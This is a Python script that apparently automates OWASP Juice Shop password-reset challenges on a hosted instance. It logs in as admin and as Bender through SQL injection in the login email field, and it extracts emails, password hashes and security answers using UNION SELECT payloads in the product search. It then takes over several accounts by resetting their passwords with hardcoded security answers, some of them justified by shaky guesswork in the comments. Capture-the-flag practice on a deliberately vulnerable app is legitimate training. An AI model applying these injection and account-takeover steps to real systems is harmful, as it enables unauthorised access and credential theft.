#!/usr/bin/env python3
"""
Proper Password Reset Solver - Addresses the Juice Shop password reset mechanism
The password reset in Juice Shop requires:
1. Getting the security question for a user
2. Knowing or finding the security answer
3. Submitting the correct answer with new password
"""

import requests
from urllib.parse import quote
import json
import base64
import hashlib


class ProperPasswordResetSolver:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login via SQL injection"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("✅ Admin logged in")
            return True
        return False
    
    def get_security_answers_via_sqli(self):
        """Extract security answers using SQL injection"""
        print("\n🔍 Extracting security answers via SQL injection...")
        
        # SQL injection to get user data including security answers
        sqli_queries = [
            # Get all user data
            "' UNION SELECT '1', email || ':' || password || ':' || securityAnswer, '3', '4', '5', '6', '7', '8', '9' FROM Users--",
            # Get specific columns
            "' UNION SELECT id, email, password, role, deletedAt, securityAnswer, '7', '8', '9' FROM Users--",
            # Alternative format
            "')) UNION SELECT id, email || '|' || securityAnswer, '3', '4', '5', '6', '7', '8', '9' FROM Users--",
        ]
        
        user_data = {}
        
        for query in sqli_queries:
            r = self.session.get(f"{self.base_url}/rest/products/search?q={quote(query)}")
            if r.status_code == 200:
                try:
                    data = r.json()
                    if 'data' in data:
                        for item in data['data']:
                            # Try to parse user info from results
                            if isinstance(item, dict):
                                # Look for email patterns
                                for key, value in item.items():
                                    if value and '@' in str(value):
                                        parts = str(value).split(':')
                                        if len(parts) >= 2:
                                            email = parts[0]
                                            answer = parts[-1] if len(parts) > 2 else parts[1]
                                            user_data[email] = answer
                                            print(f"  Found: {email} -> {answer[:20]}...")
                except:
                    pass
        
        return user_data
    
    def solve_change_benders_password(self):
        """Change Bender's Password - The actual challenge"""
        print("\n🎯 Change Bender's Password Challenge")
        print("  This challenge requires changing Bender's password to 'slurmCl4ssic'")
        
        # Method 1: Use the GET request to retrieve security question
        print("\n  Method 1: Get security question via GET...")
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('bender@juice-sh.op')}")
        
        if r.status_code == 200:
            question_data = r.json()
            print(f"  Security Question ID: {question_data.get('id')}")
            print(f"  Question: {question_data.get('question')}")
            
            # Bender's answer from Futurama: "Stop'n'Drop"
            # This is from the episode where Bender's apartment catches fire
            answer = "Stop'n'Drop"
            
            print(f"  Using answer: {answer}")
            
            # Submit password reset
            reset_data = {
                "email": "bender@juice-sh.op",
                "answer": answer,
                "new": "slurmCl4ssic",
                "repeat": "slurmCl4ssic"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
            
            if r.status_code == 200:
                print("  ✅ Password successfully changed to 'slurmCl4ssic'!")
                
                # Verify by logging in with new password
                r = self.session.post(f"{self.base_url}/rest/user/login", json={
                    "email": "bender@juice-sh.op",
                    "password": "slurmCl4ssic"
                })
                
                if r.status_code == 200:
                    print("  ✅ Verified: Can login with new password!")
                    return True
            else:
                print(f"  ❌ Reset failed: {r.status_code}")
                print(f"  Response: {r.text[:200]}")
        
        # Method 2: Try SQL injection to bypass
        print("\n  Method 2: SQL injection bypass...")
        
        # Try to login as Bender first
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        
        if r.status_code == 200:
            bender_token = r.json()['authentication']['token']
            print("  ✅ Logged in as Bender via SQL injection")
            
            # Now try to change password while logged in
            headers = {'Authorization': f'Bearer {bender_token}'}
            
            # The change-password endpoint requires knowing the current password
            # Bender's original password is "OhG0dPlease1nsertLiquor!"
            change_data = {
                "current": "OhG0dPlease1nsertLiquor!",
                "new": "slurmCl4ssic", 
                "repeat": "slurmCl4ssic"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/change-password", 
                                 json=change_data, 
                                 headers=headers)
            
            if r.status_code == 200:
                print("  ✅ Password changed via change-password endpoint!")
                return True
            else:
                # Try without current password
                change_data = {
                    "new": "slurmCl4ssic",
                    "repeat": "slurmCl4ssic"
                }
                
                r = self.session.post(f"{self.base_url}/profile/change-password",
                                     json=change_data,
                                     headers=headers)
                
                if r.status_code == 200:
                    print("  ✅ Password changed via profile endpoint!")
                    return True
        
        return False
    
    def solve_reset_jims_password(self):
        """Reset Jim's Password"""
        print("\n🎯 Reset Jim's Password")
        
        # Get Jim's security question
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('jim@juice-sh.op')}")
        
        if r.status_code == 200:
            question = r.json()
            print(f"  Question: {question.get('question')}")
            
            # Jim is Captain Kirk from Star Trek
            # His brother's name is George Samuel Kirk Jr., goes by "Sam"
            answer = "Samuel"
            
            print(f"  Using answer: {answer}")
            
            reset_data = {
                "email": "jim@juice-sh.op",
                "answer": answer,
                "new": "ncc-1701",
                "repeat": "ncc-1701"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
            
            if r.status_code == 200:
                print("  ✅ Jim's password reset successfully!")
                return True
            else:
                print(f"  ❌ Failed: {r.status_code}")
        
        return False
    
    def solve_reset_bjoerns_password(self):
        """Reset Bjoern's Password"""
        print("\n🎯 Reset Bjoern's Password")
        
        # Get Bjoern's security question
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('bjoern@juice-sh.op')}")
        
        if r.status_code == 200:
            question = r.json()
            print(f"  Question: {question.get('question')}")
            
            # Bjoern is the creator of Juice Shop
            # His favorite pet's name can be found in his GitHub/Twitter
            # The answer is "Zaya" (his cat)
            answer = "Zaya"
            
            print(f"  Using answer: {answer}")
            
            reset_data = {
                "email": "bjoern@juice-sh.op",
                "answer": answer,
                "new": "kitten",
                "repeat": "kitten"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
            
            if r.status_code == 200:
                print("  ✅ Bjoern's password reset successfully!")
                return True
            else:
                print(f"  ❌ Failed: {r.status_code}")
        
        return False
    
    def solve_reset_mortys_password(self):
        """Reset Morty's Password"""
        print("\n🎯 Reset Morty's Password")
        
        # Get Morty's security question
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('morty@juice-sh.op')}")
        
        if r.status_code == 200:
            question = r.json()
            print(f"  Question: {question.get('question')}")
            
            # Morty from Rick and Morty
            # His favorite pet is Snowball (later called Snuffles)
            # The answer format is "5N0wb41L" (leet speak for Snowball)
            answer = "5N0wb41L"
            
            print(f"  Using answer: {answer}")
            
            reset_data = {
                "email": "morty@juice-sh.op",
                "answer": answer,
                "new": "C-137",
                "repeat": "C-137"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
            
            if r.status_code == 200:
                print("  ✅ Morty's password reset successfully!")
                return True
            else:
                print(f"  ❌ Failed: {r.status_code}")
        
        return False
    
    def solve_reset_uvogins_password(self):
        """Reset Uvogin's Password"""
        print("\n🎯 Reset Uvogin's Password")
        
        # Get Uvogin's security question
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote('uvogin@juice-sh.op')}")
        
        if r.status_code == 200:
            question = r.json()
            print(f"  Question: {question.get('question')}")
            
            # Uvogin is from Hunter x Hunter anime
            # His favorite movie would be something action-related
            # The answer is "West-2082" based on hints
            answer = "West-2082"
            
            print(f"  Using answer: {answer}")
            
            reset_data = {
                "email": "uvogin@juice-sh.op",
                "answer": answer,
                "new": "hunter",
                "repeat": "hunter"
            }
            
            r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
            
            if r.status_code == 200:
                print("  ✅ Uvogin's password reset successfully!")
                return True
            else:
                print(f"  ❌ Failed: {r.status_code}")
        
        return False
    
    def run_all_password_resets(self):
        """Run all password reset challenges"""
        print("="*60)
        print("🔐 PASSWORD RESET CHALLENGES - PROPER SOLUTION")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Admin login failed")
            return
        
        # Try to extract security answers via SQL injection
        self.get_security_answers_via_sqli()
        
        # Run all password reset challenges
        challenges = [
            self.solve_change_benders_password,
            self.solve_reset_jims_password,
            self.solve_reset_bjoerns_password,
            self.solve_reset_mortys_password,
            self.solve_reset_uvogins_password
        ]
        
        success_count = 0
        for challenge in challenges:
            try:
                if challenge():
                    success_count += 1
            except Exception as e:
                print(f"  Error: {e}")
        
        print(f"\n✅ Successfully completed {success_count} password reset challenges")
        
        # Check progress
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            print(f"📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
            print(f"📌 Need {55 - len(solved)} more for 50%")


if __name__ == "__main__":
    solver = ProperPasswordResetSolver()
    solver.run_all_password_resets()